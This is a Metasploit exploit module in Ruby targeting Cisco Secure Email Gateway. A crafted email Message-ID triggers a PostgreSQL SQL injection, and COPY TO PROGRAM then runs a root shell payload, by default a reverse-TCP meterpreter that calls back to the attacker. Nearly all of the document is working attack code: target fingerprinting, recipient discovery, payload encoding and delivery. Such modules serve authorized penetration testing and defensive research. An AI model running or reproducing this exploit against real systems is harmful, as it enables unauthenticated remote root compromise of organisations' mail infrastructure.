##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMTPDeliver
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco Secure Email Gateway ECS Message-ID SQL Injection RCE',
        'Description' => %q{
          This module exploits an unauthenticated SQL injection in the Cisco
          Secure Email Gateway (SEG) Email Cloud Scanner (ECS) URL-retrospective
          message database. A sender-controlled Message-ID is placed inside a fixed
          PostgreSQL dollar-quoted string without escaping. The module sends one
          email whose quoted Message-ID terminates that string, stacks COPY TO
          PROGRAM, and executes a Unix command payload as root through AsyncOS
          runas.

          The check identifies the product through Cisco SEG's hidden SMTP
          queue-status command. AsyncOS does not expose a version through a
          benign SMTP command, so the check can only identify the product but not
          if it is explicitly vulnerable.

          URL Filtering and URL Retrospective Service must both be enabled.
        },
        'Author' => [
          'sfewer-r7' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          # This is the likely CVE attribution as the Cisco IOC for /COPY.*TO PROGRAM/ in mail_logs will match.
          [ 'CVE', '2026-76461' ],
          [ 'URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-esa-inj-2bLVGmhX' ]
        ],
        'DisclosureDate' => '2026-09-14',
        'Privileged' => true,
        'Payload' => {
          # Even with a one-byte valid recipient domain, the fixed RFC/SQL/runas framing consumes
          # 171 of the 998 available header bytes. Space therefore bounds the largest Framework
          # command that can ever fit; the actual domain-dependent limit is checked below.
          'Space' => 827,
          'DisableNops' => true,
          # Some compatible payloads call the non-POSIX `which` utility, which AsyncOS omits.
          # Supply the same lookup through the shell's POSIX `command -v` builtin. Framework
          # payloads pass one command name, so this preserves their normal fallback behavior.
          'Prepend' => 'which(){ command -v $@;};',
          # The selected command is nested in an RFC quoted Message-ID, a PostgreSQL string, and
          # a shell-quoted `runas ... sh -c` argument. Encode control/non-ASCII bytes plus the
          # quote and escape characters that any of those layers could consume or transform.
          'BadChars' => [ *(0x00..0x1f), 0x22, 0x27, 0x5c, *(0x7f..0xff) ].pack('C*'),
          # The command adapter and telnet payload both contain forbidden shell quoting. Let the
          # Framework make them safe instead of adding a second module-specific payload encoding.
          'Encoder' => 'cmd/base64',
          # AsyncOS supplies OpenSSL, so use a known decoder instead of relying on a PATH search
          # for a base64 utility whose supported command-line switches vary between systems.
          'EncoderOptions' => { 'Base64Decoder' => 'openssl' }
        },
        'Targets' => [
          [
            # Tested with the following payloads:
            # * cmd/unix/python/meterpreter/reverse_tcp
            # * cmd/unix/reverse
            # * cmd/unix/reverse_openssl
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp' } # rubocop:disable Lint/ModuleDefaultPayload
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          # SMTP acceptance only queues the message. ECS uses a stock 300-second polling
          # interval, but its idle DB writer sleeps for half of it, delaying SQL execution
          # by up to 150 seconds; allow the full interval for processing and payload startup.
          'WfsDelay' => 300
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        }
      )
    )

    register_options([
      OptString.new('MAILFROM', [ false, 'Email sender address']),
      OptString.new('MAILTO', [ false, 'Email recipient address accepted by the gateway']),
      OptString.new('SUBJECT', [ false, 'Email subject'])
    ])
  end

  def check
    # Use the same negotiated SMTP session as delivery so this fingerprint also works when the
    # listener requires STARTTLS or supported SMTP authentication.
    connect_login

    # EUQ_FULL is an undocumented, AsyncOS SMTP command.
    response = smtp_send_recv("EUQ_FULL\r\n").to_s

    # This proves the target is running AsyncOS, but it may be either Cisco Secure Email Gateway or Cisco Secure Web
    # Appliance. It cannot distinguish a vulnerable release from a fixed release.
    # We could also try the HTTPS service, as that reports teh product type and version, but then we assume
    # access to that interface/port which may not be true.
    return CheckCode::Detected('Detected an SMTP service on AsyncOS. Target is likely a Cisco Secure Email Gateway.') if response.match?(/\A(?:250 EUQ not full|491 #4\.9\.1 EUQ database full)\r\n\z/)

    CheckCode::Unknown('Detected an SMTP service, but the target does not appear to be a Cisco Secure Email Gateway')
  rescue Rex::ConnectionError, Rex::TimeoutError, Msf::Exploit::Remote::SMTPDeliver::SMTPCommunicationError, EOFError => e
    CheckCode::Unknown(e.message)
  ensure
    disconnect if connected?
  end

  def exploit
    # Each run needs a new Message-ID so repeated tests never reuse ECS message state.
    nonce = Rex::Text.rand_text_hex(16).downcase

    program = payload_program

    # Discover an address the gateway accepts instead of assuming its configured mail domain.
    recipient = discover_recipient(nonce)

    domain = recipient.split('@', 2).last

    # By default, use the discovered local domain instead of a hard-coded sender domain.
    sender = datastore['MAILFROM'].blank? ? "#{nonce}@#{domain}" : datastore['MAILFROM']

    # A random default subject avoids a fixed network indicator; SUBJECT remains available for tracing.
    subject = datastore['SUBJECT'].blank? ? nonce : datastore['SUBJECT']

    message_id = build_message_id(program, nonce, domain)

    # Payload Space does not include the SQL syntax, runas wrapper, or recipient domain. Validate
    # the final representation so successful delivery never depends on a non-conforming SMTP line.
    fail_with(Failure::BadConfig, 'Encoded payload makes the Message-ID header exceed 998 bytes') if "Message-ID: #{message_id}".bytesize > 998

    print_status('Generating the ECS exploit email')

    email = build_message(message_id, nonce, sender, recipient, subject)

    print_status("Sending #{email.bytesize}-byte ECS exploit email")

    response = deliver_message(email, 'MAILFROM' => sender, 'MAILTO' => recipient)

    # SMTP success means the gateway queued the message; ECS executes the payload asynchronously.
    fail_with(Failure::UnexpectedReply, 'SMTP DATA was not accepted') unless response&.start_with?('250')

    print_good('Exploit email accepted (payload can take 5 minutes to trigger)')
  end

  def discover_recipient(nonce)
    # Recipient policy can depend on TLS and authentication, so negotiate the session before
    # testing any envelope. RSET preserves that session while clearing each test envelope.
    connect_login

    # Prefer an operator-supplied mailbox when one is known to be valid.
    candidates = [ datastore['MAILTO'] ].compact.reject(&:blank?)

    if candidates.empty?
      # SMTP banners normally contain the gateway hostname, not a mailbox address.
      hostname = banner.to_s[/\A220\s+([^\s]+)/, 1].to_s.downcase

      labels = hostname.split('.')

      # Try the hostname and its parent domains, but never send message data during these probes.
      candidates = labels.each_index.filter_map { |index| labels[index..].join('.') if labels.length - index >= 2 }
    end

    candidates.each do |address_or_domain|
      address = address_or_domain.include?('@') ? address_or_domain : "#{nonce}@#{address_or_domain}"

      next unless address.match?(/\A[^\s<>@]+@[a-z0-9.-]+\z/i)

      return address if recipient_accepted?(address, nonce)
    end

    fail_with(Failure::BadConfig, 'Could not discover an accepted recipient domain; set MAILTO')
  ensure
    disconnect if connected?
  end

  def deliver_message(message, envelope)
    # SMTPDeliver reads MAILFROM and MAILTO from the shared datastore.
    original = envelope.keys.to_h { |key| [ key, datastore[key] ] }

    # Use values derived for this one message, then restore the operator's settings in ensure.
    envelope.each { |key, value| datastore[key] = value }

    send_message(message)
  ensure
    original&.each { |key, value| datastore[key] = value }
  end

  def recipient_accepted?(address, nonce)
    domain = address.split('@', 2).last

    # Recipient policy can depend on the envelope sender, so probe with the same normalized sender
    # that SMTPDeliver uses for the final message.
    sender = datastore['MAILFROM'].blank? ? "#{nonce}@#{domain}" : datastore['MAILFROM'].strip

    return false if bad_address(sender)

    return false unless smtp_send_recv("MAIL FROM: <#{sender}>\r\n").to_s.start_with?('250')

    # SMTPDeliver proceeds only after code 250, so discovery must use the same requirement.
    accepted = smtp_send_recv("RCPT TO: <#{address}>\r\n").to_s.start_with?('250')

    # RSET discards the test envelope so discovery never queues an email.
    smtp_send_recv("RSET\r\n")

    accepted
  end

  def payload_program
    # PostgreSQL starts PROGRAM through its unprivileged shell. Pass the Framework-encoded command
    # as one argument to the setuid runas helper so no pipeline stage executes before UID 0.
    "/data/bin/runas root /bin/sh -c '#{payload.encoded}'"
  end

  def build_message_id(program, nonce, domain)
    # During final inbound processing, AsyncOS passes the parsed Message-ID to ECS's
    # update_query_message_store(), which directly inserts it into this PostgreSQL expression:
    #   SET message_id = $msg_id$<Message-ID>$msg_id$, ...
    # `$msg_id$` is a fixed dollar-quote delimiter, so the same token in the header ends the
    # intended string and makes the rest of the header SQL syntax.
    #
    # The malicious id-left turns that query into three statements:
    #   1. `WHERE FALSE` finishes the original UPDATE as a harmless no-op.
    #   2. `COPY ... TO PROGRAM` runs the supplied program, whose runas command reaches root.
    #   3. A replacement UPDATE opens another dollar-quoted value; the original delimiter and
    #      query suffix then close that value and finish valid SQL.
    # PostgreSQL accepts an UPDATE that changes zero rows, so this works without knowing the
    # appliance-generated UUID or requiring a matching messages_store row.

    # PROGRAM is a single-quoted SQL value. Payload BadChars leave only the module-owned shell
    # quotes, which are doubled here for PostgreSQL and restored before the outer shell sees them.
    # Backslashes are excluded because this appliance uses standard_conforming_strings=off.
    escaped_program = program.gsub("'", "''")

    id_left = "#{nonce}$msg_id$ WHERE FALSE; COPY (SELECT '') TO PROGRAM '#{escaped_program}'; UPDATE messages_store SET message_id = $msg_id$"

    # A quoted local part permits the SQL punctuation in a syntactically valid Message-ID. The
    # `"@domain>` suffix becomes data in the replacement UPDATE instead of being parsed as SQL.
    %(<"#{id_left}"@#{domain}>)
  end

  def build_message(message_id, nonce, sender, recipient, subject)
    message = Rex::MIME::Message.new
    message.mime_defaults
    message.from = "<#{sender}>"
    message.to = "<#{recipient}>"
    message.subject = subject
    message.header.set('Message-ID', message_id)
    message.add_part(nonce, 'text/plain; charset=us-ascii', '7bit')

    message.to_s
  end
end
